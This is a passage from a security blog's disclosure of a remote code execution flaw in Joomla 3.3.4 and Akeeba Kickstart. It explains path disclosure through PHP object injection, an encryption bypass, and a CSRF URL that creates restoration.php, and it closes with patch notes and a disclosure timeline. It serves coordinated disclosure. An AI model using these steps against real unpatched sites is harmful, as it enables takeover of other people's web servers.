A remaining step is to find out the local document root path on the targeted web server where the PHP shell should be extracted to. While */var/www/* might be very common, different web server use different paths on different operating systems.

### 4. Path Disclosure

Due to the PHP object injection we can trigger fatal errors in the application to receive the document root path from an error message. However, this would require error reporting and displaying by PHP, which is often disabled in production environments.

The previously mentioned *$retArray* does not only contain the current status about the processed files added so far, but also the complete serialized *AKFactory* object (line 5607). It is printed json encoded to the HTML response page.

```

$json = json_encode($retArray);
// Do I have to encrypt?
$password = AKFactory::get('kickstart.security.password', null);
if(!empty($password))
{
	$json = AKEncryptionAES::AESEncryptCtr($json, $password, 128);
}

// Return the message
echo "###$json###";

```

The encryption can be bypassed again, if we use the PHP object injection to overwrite the *kickstart.security.password* setting in *AKFactory* with an empty password. One way to include the document root into the *AKFactory* is to set the *kickstart.setup.destdir* setting in our injected *AKFactory* object to an empty string. Then, the built-in function *getcwd()* will fill the destination directory with the current working directory of the script.

```

$destdir = self::get('kickstart.setup.destdir', null);
if(empty($destdir))
{
	$destdir = function_exists('getcwd') ? getcwd() : dirname(__FILE__);
}

```

This way, the full path of the script is added to the serialized *AKFactory* object in the HTML response and the document root can be obtained by the attacker. Also, if the *restoration.php* file is created naturally, it includes the destination directory of the update as setup parameter. It usually points to an installation directory within the document root.

### 5. Ping or CSRF (CVE 2014-7229)

One important last step remains for exploitation. The Akeeba Kickstart script will abort in the beginning if no *restoration.php* file exists. This file is created during an update, but is deleted again at the end of an update. This makes it difficult to exploit the issue, but not impossible.

An update lasts about 3 seconds. That means an attacker can constantly ping the targeted installation for an existing *administrator/components/com\_joomlaupdate/restoration.php* file during an update period. If the administrator performs the update, the *restoration.php* file will exist long enough to carry out the attack. Note, that this attack would generate quite some log entries.

For Joomla!, there is an alternative. The following URL will create a valid *restoration.php* file persistently if opened by an administrator:

 `/administrator/index.php?option=com_joomlaupdate&task=update.install`

Joomla! will attempt to start an update but cannot finish it because of missing parameters. Because no CSRF token is in place, the link can be used against logged-in administrators in a CSRF attack (e.g., Joomla article comment). Once the CSRF attack succeeded, the attacker can exploit at any time.

### Summary

Joomla! 3.3.4 and [various](https://www.akeebabackup.com/home/news/1605-security-update-sep-2014.html) Akeeba Backup products are affected by a vulnerability that leads to remote code execution on the targeted web server. However, the attack requires social engineering against an administrator or repeatedly sent requests to the web server until an update is performed.

[Joomla!](http://www.joomla.org/announcements/release-news/5569-joomla-3-3-6-released.html) and [Akeeba Backup](https://www.akeebabackup.com/home/news/1605-security-update-sep-2014.html) have released patches. It it is advised to update your software immediately and if possible, this time maybe not through Akeeba Kickstart ;). You may also want to check your web server‚Äôs *access.log*. I would like to thank Michael Babker (JSST) and Nicholas Dionysopoulos (Akeeba) for a very fast respond and patch time!

#### Timeline

[24.09.2014] ‚Äì Asking for direct contact at [JSST](http://developer.joomla.org/contact-security-team.html) and [Akeeba Backup](https://www.akeebabackup.com/contact-us.html)

[24.09.2014] ‚Äì Advisory + PoC disclosure to both vendors

[24.09.2014] ‚Äì Patch provided by Akeeba Backup for review

[29.09.2014] ‚Äì [CVE-2014-7228](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7228) and [CVE-2014-7229](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7229) assigned

[30.09.2014] ‚Äì Security updates for [affected Akeeba products](https://www.akeebabackup.com/home/news/1605-security-update-sep-2014.html) released

[30.09.2014] ‚Äì [Joomla! 3.3.5](http://www.joomla.org/announcements/release-news/5567-joomla-3-3-5-released.html) released

[01.10.2014] ‚Äì [Joomla! 3.3.6](http://www.joomla.org/announcements/release-news/5569-joomla-3-3-6-released.html) released

### Share this:

* [Facebook](https://websec.wordpress.com/2014/10/05/joomla-3-3-4-akeeba-kickstart-remote-code-execution-cve-2014-7228/?share=facebook "Click to share on Facebook")
* [X](https://websec.wordpress.com/2014/10/05/joomla-3-3-4-akeeba-kickstart-remote-code-execution-cve-2014-7228/?share=x "Click to share on X")
Like Loading...
### *Related*

This entry was posted on Sunday, October 5th, 2014 at 10:22 pm and is filed under [PHP](https://websec.wordpress.com/category/php/), [Vulns](https://websec.wordpress.com/category/vulns/), [Web Security](https://websec.wordpress.com/category/web-security/). You can follow any responses to this entry through the [RSS 2.0](https://websec.wordpress.com/2014/10/05/joomla-3-3-4-akeeba-kickstart-remote-code-execution-cve-2014-7228/feed/) feed.
You can skip to the end and leave a response. Pinging is currently not allowed.

### Post navigation

[¬´ Previous Post](https://websec.wordpress.com/2014/10/03/joomla-3-0-2-poi-cve-2013-1453-gadget-chains/)
[Next Post ¬ª](https://websec.wordpress.com/2014/12/08/magento-1-9-0-1-poi/)

### Leave a comment [Cancel reply](/2014/10/05/joomla-3-3-4-akeeba-kickstart-remote-code-execution-cve-2014-7228/#respond)

Œî

* ## Archives

  + [November 2016](https://websec.wordpress.com/2016/11/)
  + [January 2015](https://websec.wordpress.com/2015/01/)
  + [December 2014](https://websec.wordpress.com/2014/12/)
  + [October 2014](https://websec.wordpress.com/2014/10/)
  + [May 2013](https://websec.wordpress.com/2013/05/)
  + [March 2013](https://websec.wordpress.com/2013/03/)
  + [February 2013](https://websec.wordpress.com/2013/02/)
  + [June 2012](https://websec.wordpress.com/2012/06/)
  + [January 2012](https://websec.wordpress.com/2012/01/)
  + [December 2011](https://websec.wordpress.com/2011/12/)
  + [September 2011](https://websec.wordpress.com/2011/09/)
  + [June 2011](https://websec.wordpress.com/2011/06/)
  + [April 2011](https://websec.wordpress.com/2011/04/)
  + [December 2010](https://websec.wordpress.com/2010/12/)
  + [October 2010](https://websec.wordpress.com/2010/10/)
  + [June 2010](https://websec.wordpress.com/2010/06/)
  + [May 2010](https://websec.wordpress.com/2010/05/)
  + [March 2010](https://websec.wordpress.com/2010/03/)
  + [February 2010](https://websec.wordpress.com/2010/02/)
  + [November 2009](https://websec.wordpress.com/2009/11/)
  + [January 2009](https://websec.wordpress.com/2009/01/)
  + [December 2008](https://websec.wordpress.com/2008/12/)
  + [October 2008](https://websec.wordpress.com/2008/10/)
  + [September 2008](https://websec.wordpress.com/2008/09/)
  + [May 2008](https://websec.wordpress.com/2008/05/)
  + [November 2007](https://websec.wordpress.com/2007/11/)
* ## Categories

  + [CTF](https://websec.wordpress.com/category/ctf/)
  + [Java](https://websec.wordpress.com/category/java/)
  + [Other](https://websec.wordpress.com/category/other/)
  + [PHP](https://websec.wordpress.com/category/php/)
  + [Projects](https://websec.wordpress.com/category/projects/)
  + [SQLi](https://websec.wordpress.com/category/sqli/)
  + [Vulns](https://websec.wordpress.com/category/vulns/)
  + [Web Security](https://websec.wordpress.com/category/web-security/)
  + [XSS](https://websec.wordpress.com/category/xss/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* [Comment](https://websec.wordpress.com/2014/10/05/joomla-3-3-4-akeeba-kickstart-remote-code-execution-cve-2014-7228/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Reiners' Weblog](https://websec.wordpress.com)

  Join 114 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fwebsec.wordpress.com%2F2014%2F10%2F05%2Fjoomla-3-3-4-akeeba-kickstart-remote-code-execution-cve-2014-7228%2F&signup_flow=account)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Reiners' Weblog](https://websec.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fwebsec.wordpress.com%2F2014%2F10%2F05%2Fjoomla-3-3-4-akeeba-kickstart-remote-code-execution-cve-2014-7228%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/p8KAZ-gP)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://websec.wordpress.com/2014/10/05/joomla-3-3-4-akeeba-kickstart-remote-code-execution-cve-2014-7228/)
  + [View post in Reader](https://wordpress.com/read/blogs/2085741/posts/1043)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)


